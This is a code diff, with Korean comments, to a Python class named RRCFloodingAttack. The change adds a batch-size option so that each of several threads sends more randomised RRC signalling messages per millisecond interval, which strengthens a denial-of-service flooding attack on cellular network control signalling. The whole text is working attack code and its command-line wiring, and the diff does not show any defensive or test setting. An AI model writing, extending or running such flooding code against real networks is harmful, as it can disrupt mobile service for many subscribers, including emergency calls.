@@ -94,31 +94,33 @@ class RRCFloodingAttack:
         except Exception as e:
             return 0, str(e)
     
-    def flooding_thread(self, thread_id, messages, duration, interval=0.001):
+    def flooding_thread(self, thread_id, messages, duration, interval=0.001, batch_size=1):
         """Flooding 스레드"""
         thread_stats = {"sent": 0, "errors": 0}
         start_time = time.time()
         
-        print(f"[스레드 {thread_id}] 시작")
+        print(f"[스레드 {thread_id}] 시작 (배치 크기: {batch_size})")
         
         while self.running and (time.time() - start_time) < duration:
             try:
-                # 랜덤 메시지 선택
-                base_message = random.choice(messages)
-                
-                # 랜덤 메시지 생성
-                message_bytes = self.generate_random_message(base_message)
-                
-                if message_bytes:
-                    # 메시지 전송
-                    bytes_sent, response = self.send_message(message_bytes)
+                # 배치 크기만큼 메시지 생성 및 전송
+                for _ in range(batch_size):
+                    # 랜덤 메시지 선택
+                    base_message = random.choice(messages)
                     
-                    if bytes_sent > 0:
-                        thread_stats["sent"] += 1
-                        self.stats["total_sent"] += 1
-                    else:
-                        thread_stats["errors"] += 1
-                        self.stats["total_errors"] += 1
+                    # 랜덤 메시지 생성
+                    message_bytes = self.generate_random_message(base_message)
+                    
+                    if message_bytes:
+                        # 메시지 전송
+                        bytes_sent, response = self.send_message(message_bytes)
+                        
+                        if bytes_sent > 0:
+                            thread_stats["sent"] += 1
+                            self.stats["total_sent"] += 1
+                        else:
+                            thread_stats["errors"] += 1
+                            self.stats["total_errors"] += 1
                 
                 # 간격 대기
                 time.sleep(interval)
@@ -129,7 +131,7 @@ class RRCFloodingAttack:
         
         print(f"[스레드 {thread_id}] 완료 - 전송: {thread_stats['sent']}, 오류: {thread_stats['errors']}")
     
-    def start_flooding(self, messages, num_threads=10, duration=60, interval=0.001):
+    def start_flooding(self, messages, num_threads=10, duration=60, interval=0.001, batch_size=1):
         """Flooding 공격 시작"""
         if not messages:
             print("RRC 메시지가 없습니다.")
@@ -140,6 +142,7 @@ class RRCFloodingAttack:
         print(f"스레드 수: {num_threads}")
         print(f"지속 시간: {duration}초")
         print(f"메시지 간격: {interval}초")
+        print(f"배치 크기: {batch_size}")
         print(f"사용할 RRC 메시지 수: {len(messages)}")
         print("=" * 50)
         
@@ -151,7 +154,7 @@ class RRCFloodingAttack:
         for i in range(num_threads):
             thread = threading.Thread(
                 target=self.flooding_thread,
-                args=(i+1, messages, duration, interval)
+                args=(i+1, messages, duration, interval, batch_size)
             )
             threads.append(thread)
             thread.start()
@@ -233,6 +236,7 @@ def main():
     parser.add_argument("--threads", type=int, default=10, help="스레드 수")
     parser.add_argument("--duration", type=int, default=60, help="지속 시간 (초)")
     parser.add_argument("--interval", type=float, default=0.001, help="메시지 간격 (초)")
+    parser.add_argument("--batch-size", type=int, default=1, help="배치 크기 (한 번에 전송할 메시지 수)")
     
     args = parser.parse_args()
     
@@ -246,7 +250,7 @@ def main():
     
     try:
         # Flooding 공격 실행
-        if attack.start_flooding(messages, args.threads, args.duration, args.interval):
+        if attack.start_flooding(messages, args.threads, args.duration, args.interval, args.batch_size):
             # 결과 저장
             attack.save_results()
         else:
